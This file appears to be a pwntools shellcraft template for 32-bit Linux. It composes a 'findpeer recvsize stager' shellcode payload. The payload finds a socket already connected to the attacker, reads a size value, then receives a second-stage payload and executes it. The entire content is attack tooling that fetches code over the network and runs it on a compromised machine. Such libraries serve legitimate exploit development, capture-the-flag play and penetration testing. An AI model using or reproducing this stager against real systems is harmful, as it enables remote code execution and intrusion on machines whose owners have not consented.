<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.i386 import linux %>
<%docstring>
Findpeer recvsize stager
Args:
    port, the port given to findpeer (defaults to any)
</%docstring>
<%page args="port = None"/>

${linux.findpeer(port)}
${linux.recvsize('esi', 'ecx')}
${linux.stager('ebx', 'ecx')}
